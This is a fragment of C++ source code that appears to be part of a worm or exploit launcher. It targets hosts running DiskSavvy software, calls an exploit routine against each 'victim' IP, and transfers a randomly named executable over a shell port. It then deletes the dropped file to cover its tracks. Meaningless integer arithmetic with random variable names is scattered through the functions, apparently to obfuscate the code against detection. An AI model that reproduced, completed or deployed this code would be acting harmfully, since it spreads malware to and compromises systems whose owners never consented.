int i7znKalZ0pn = iOWpQyZWafc / 0x050632d + iZrUTSQjLke ^ ikFJwJVjvQn - 0xdb45652;

	sock = isTarget_DiskSavvy_44156(pData->strIP);
	if (sock) {
		std::string tmpFileName ="";
		tmpFileName = fileName;
		if (isRandomName) {
		tmpFileName = RandomStr(8) + ".exe";
		//[randomeNameModule](tmpFileName);
		}
		printf("victim: %s\n", pData->strIP);
		DiskSavvy_44156(sock, pData->strIP);
		int a;
		a = Base64P2P(pData->strIP, pData->shellPort, tmpFileName);
		//printf("Done exploti!");
		if (isRandomName)
		{
			//delete new exe
			std::string NewExePath = (std::string)fullName;
			NewExePath = NewExePath.substr(0, NewExePath.find_last_of("\\"));
			NewExePath += "\\" + tmpFileName;
			DeleteFileA(NewExePath.c_str());
		}
		printf("DEBUG %d\n", a);
	}
	else
	{
		printf("ip: %s can't exploit!\n", pData->strIP);
	}
	return 0;
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
int i554ZI21jMl = 0xe5a4fd6;
int iA7sTPmp1ND = 0x19f295b;
int ic4uHlE0wEL = 0x3543e42;
int iGWctqvtKKu = ic4uHlE0wEL * iA7sTPmp1ND + i554ZI21jMl;
iA7sTPmp1ND = 0x48c03ef + iGWctqvtKKu + 0x76e26c8 + i554ZI21jMl;
int inRloixblaR = i554ZI21jMl / 0x19f295b - ic4uHlE0wEL ^ ic4uHlE0wEL ^ 0x3543e42;

	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
